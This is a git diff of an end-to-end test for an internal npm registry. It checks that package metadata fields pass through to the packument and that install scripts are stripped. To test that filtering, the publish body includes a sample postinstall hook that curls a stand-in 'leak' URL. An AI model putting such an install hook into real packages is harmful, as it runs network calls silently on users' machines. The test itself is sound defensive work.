@@ -56,11 +56,25 @@ describe('npm / PyPI registry 协议（e2e）', () => {
 
   it('npm publish → packument → tarball 下载全链路', async () => {
     const dsh = { bundle: { patch: './cordis.patch.yml' } };
-    const tarball = await makeNpmTarball('e2e-npm-lib', '1.0.0', {
+    const extra = {
       description: '端到端测试包',
       engines: { node: '>=18' },
       dsh,
-    });
+      peerDependencies: { '@deepseek-ai/dsh': '>=0.2.1' },
+      peerDependenciesMeta: { '@deepseek-ai/dsh': { optional: true } },
+      optionalDependencies: { fsevents: '^2.3.3' },
+      os: ['darwin', 'linux'],
+      cpu: ['x64', 'arm64'],
+      bin: { 'e2e-npm-lib': './bin.js' },
+      main: './index.js',
+      module: './index.mjs',
+      exports: { '.': './index.js' },
+      license: 'MIT',
+      repository: { type: 'git', url: 'https://example.internal/repo.git' },
+      homepage: 'https://example.internal/e2e',
+      keywords: ['e2e', 'internal'],
+    };
+    const tarball = await makeNpmTarball('e2e-npm-lib', '1.0.0', extra);
 
     const publish = await request(ctx.baseUrl)
       .put('/npm/e2e-npm-lib')
@@ -70,7 +84,16 @@ describe('npm / PyPI registry 协议（e2e）', () => {
         name: 'e2e-npm-lib',
         description: '端到端测试包',
         'dist-tags': { latest: '1.0.0' },
-        versions: { '1.0.0': { name: 'e2e-npm-lib', version: '1.0.0', dsh, dist: {} } },
+        versions: {
+          '1.0.0': {
+            name: 'e2e-npm-lib',
+            version: '1.0.0',
+            ...extra,
+            // 只在发布体里出现，用于验证 scripts 不会被透传；放进 tarball 会被安全扫描隔离
+            scripts: { postinstall: 'curl http://internal.example/leak' },
+            dist: {},
+          },
+        },
         _attachments: {
           'e2e-npm-lib-1.0.0.tgz': { data: tarball.toString('base64'), length: tarball.length },
         },
@@ -95,7 +118,25 @@ describe('npm / PyPI registry 协议（e2e）', () => {
     // dsh 组合包声明必须从 package.json 透传到 packument，harness 据此识别插件
     expect(packument.body.dsh).toEqual(dsh);
     expect(packument.body.versions['1.0.0'].dsh).toEqual(dsh);
-    expect(packument.body.versions['1.0.0'].dist.tarball).toContain('/npm/e2e-npm-lib/-/e2e-npm-lib-1.0.0.tgz');
+    // 安装解析需要的白名单字段在版本级与根级都要可见
+    const versionDoc = packument.body.versions['1.0.0'];
+    expect(versionDoc.peerDependencies).toEqual(extra.peerDependencies);
+    expect(versionDoc.peerDependenciesMeta).toEqual(extra.peerDependenciesMeta);
+    expect(versionDoc.optionalDependencies).toEqual(extra.optionalDependencies);
+    expect(versionDoc.os).toEqual(extra.os);
+    expect(versionDoc.cpu).toEqual(extra.cpu);
+    expect(versionDoc.bin).toEqual(extra.bin);
+    expect(versionDoc.main).toBe(extra.main);
+    expect(versionDoc.module).toBe(extra.module);
+    expect(versionDoc.exports).toEqual(extra.exports);
+    expect(packument.body.license).toBe(extra.license);
+    expect(packument.body.repository).toEqual(extra.repository);
+    expect(packument.body.homepage).toBe(extra.homepage);
+    expect(packument.body.keywords).toEqual(extra.keywords);
+    // scripts 属于敏感执行内容，白名单必须挡住，不能出现在 packument
+    expect(versionDoc.scripts).toBeUndefined();
+    expect(packument.body.scripts).toBeUndefined();
+    expect(versionDoc.dist.tarball).toContain('/npm/e2e-npm-lib/-/e2e-npm-lib-1.0.0.tgz');
 
     const download = await request(ctx.baseUrl).get('/npm/e2e-npm-lib/-/e2e-npm-lib-1.0.0.tgz').expect(200);
     expect(Number(download.headers['content-length'])).toBe(tarball.length);
